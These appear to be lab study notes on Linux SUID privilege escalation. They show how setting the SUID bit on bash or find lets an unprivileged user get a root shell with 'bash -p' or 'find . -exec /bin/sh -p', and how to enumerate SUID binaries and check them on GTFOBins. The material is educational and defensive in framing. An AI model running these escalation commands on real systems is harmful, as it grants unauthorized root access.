# SUID (Set User ID) Privilege Escalation

> [!info] Core Concept
> **SUID** is a special file permission that allows a program to run with the **file owner's privileges** (usually root), regardless of who executes it.
> - **SUID is global** — any user on the system can exploit a SUID binary.
> - **sudo is user-specific** — only explicitly allowed users can use it.

---

## 1. Understanding SUID Permissions

| Permission Bit | Meaning |
| -------------- | ---------------------- |
| `+r`           | Read                   |
| `+w`           | Write                  |
| `+x`           | Execute                |
| `+s`           | **Set User ID (SUID)** |

When the SUID bit is set on an executable owned by root, the kernel starts it with an **effective UID (EUID) of 0 (root)**, even if a regular user runs it.

You can recognise SUID in `ls -l` output by the **`s`** in the owner-execute position:

```
-rwsr-xr-x 1 root root ... /usr/bin/bash
```

## 3. Example 1 — Exploiting SUID `bash`

### 3.1 Setting the SUID Bit on Bash

```bash
┌──(kali㉿kali)-[~]
└─$ sudo chmod +s /usr/bin/bash
[sudo] password for kali: 
```

### 3.2 Exploiting with `bash -p`

```bash
┌──(kali㉿kali)-[~]
└─$ bash 
bash-5.3$ whoami
kali
bash-5.3$ bash -p
bash-5.3# whoami
root
```

> [!tip] Key Indicator
> The prompt changed from `$` (regular user) to `#` (root), and `whoami` returned `root`.

### 3.3 How `bash -p` Works

The `-p` flag means **privileged mode**.

- Normally, when Bash detects it is running as a SUID program (i.e., real UID ≠ effective UID), it **drops privileges** for safety.
- With `-p`, Bash **preserves the effective UID instead of dropping it**.
- `-p` does **not** magically grant root — it only keeps privileges that are already inherited from the SUID bit.

Because we set SUID on `/usr/bin/bash` (owned by root), the kernel starts Bash with EUID = 0. The `-p` flag tells Bash to keep that EUID:

```bash
$ bash -p
# whoami
root
```

> [!warning] Security Note
> Setting the SUID bit on `bash` is **highly insecure** on a real system because it allows **any** local user to obtain a root shell with `bash -p`.

### 3.4 Restoring Normal Permissions

As root, remove the SUID bit:

```bash
chmod u-s,g-s /usr/bin/bash
```

Verify:

```bash
ls -l /usr/bin/bash
```

Expected output (no `s`):

```
-rwxr-xr-x 1 root root ... /usr/bin/bash
```

Then exit all shells and log in fresh:

```bash
exit
exit
su - oscp
```

Normal prompt is restored:

```
┌──(oscp㉿kali)-[~]
└─$
```

> [!tip] Lab Best Practice
> Don't leave `/usr/bin/bash` SUID permanently. Set the SUID bit only while practising, then remove it immediately:
> ```bash
> chmod u-s,g-s /usr/bin/bash
> ```

## 5. GTFOBins — Checking If a SUID Binary Is Exploitable

**GTFOBins:** https://gtfobins.github.io/

GTFOBins is a curated list of Unix binaries that can be exploited to bypass security restrictions.

### How to Check

1. Search for the binary name on GTFOBins.
2. If the binary's page has a **"SUID"** section → you **can** get a root shell.
3. If it only shows other categories (e.g., "Sudo", "Capabilities") but **not** "SUID" → you **cannot** exploit it via SUID alone.

## 6. Example 2 — Exploiting SUID `find`

### 6.1 Setting the SUID Bit on `find`

```bash
┌──(kali㉿kali)-[~]
└─$ sudo chmod +s /usr/bin/find
```

After this, permissions change from `-rwxr-xr-x` to `-rwsr-xr-x` (note the `s`).

### 6.2 Looking Up `find` on GTFOBins

Search for `find` on GTFOBins and copy the SUID exploit command:

![](attachments/Pasted%20image%2020260711151518.png)

### 6.3 Running the Exploit

```bash
find . -exec /bin/sh -p \; -quit
```

```bash
┌──(oscp㉿kali)-[/home/kali]
└─$ find . -exec /bin/sh -p \; -quit
# whoami
root
```

Root obtained — even though `oscp` has **no** sudo permissions:

```bash
┌──(oscp㉿kali)-[/home/kali]
└─$ sudo -l
[sudo] password for oscp: 
Sorry, user oscp may not run sudo on kali.
```

> [!note] Prerequisite
> This only works if `find` has the SUID bit set and is owned by root. On a normal system it will just open a regular shell.

### 6.4 Command Breakdown

```
find . -exec /bin/sh -p \; -quit
```

| Component     | Purpose                                                                                     |
| ------------- | ------------------------------------------------------------------------------------------- |
| `find .`      | Search starting from the current directory                                                  |
| `-exec`       | Execute a command for each found file                                                       |
| `/bin/sh`     | Launch a shell                                                                              |
| `-p`          | Preserve the effective privileges (critical for SUID scenarios)                             |
| `\;`          | End the `-exec` command (`\` prevents the shell from interpreting `;` as a command separator)|
| `-quit`       | Stop after the first execution (no need to traverse the entire tree)                        |

**Detailed walkthrough of each part:**

#### `find .`

Searches for files and directories starting from the current directory:

```
Current directory
│
├── file1
├── notes.txt
└── folder
```

`find .` walks through every file and directory.

#### `-exec COMMAND \;`

Tells `find`: "For every file you find, execute this command."

General syntax:

```
find <path> -exec <command> {} \;
```

- `{}` = placeholder for the current file
- `\;` = marks the end of the command

Example:

```
find . -exec ls -l {} \;
```

Becomes:

```
ls -l ./file1
ls -l ./notes.txt
ls -l ./folder
```

#### `/bin/sh -p`

Instead of `ls`, we tell `find` to start a shell. The `-p` flag preserves the effective UID.

If `find` is running with:

```
UID  = oscp
EUID = root
```

Then `sh -p` keeps:

```
UID  = oscp
EUID = root
```

Without `-p`, many shells discard the elevated privileges.

#### `-quit`

Without `-quit`, `find` would continue traversing the entire directory tree after the shell exits. Since we already have our shell, `-quit` tells `find` to stop immediately after the first match, making the command faster.

> [!summary] In Plain English
> "Start searching from the current directory. As soon as you find the first entry, execute a shell that preserves the elevated privileges inherited from the SUID `find` process, then stop searching."

## 7. Quick Reference — SUID Exploitation Workflow

```
1. Enumerate SUID binaries
   └─ find / -user root -perm /4000 2>/dev/null

2. Cross-reference each binary on GTFOBins
   └─ https://gtfobins.github.io/

3. Check if the binary has a "SUID" section
   └─ YES → copy the exploit command and run it
   └─ NO  → not exploitable via SUID

4. Clean up — remove SUID bit after practice
   └─ sudo chmod -s /usr/bin/<binary>
```

> [!abstract] SUID vs Sudo
> | Feature | SUID | Sudo |
> |---------|------|------|
> | Scope | **Global** — any user can exploit | **User-specific** — only allowed users |
> | Configuration | File permission bit on the binary | `/etc/sudoers` entries |
> | Set with | `chmod +s /path/to/binary` | `visudo` |
> | Remove with | `chmod -s /path/to/binary` | Edit `/etc/sudoers` |
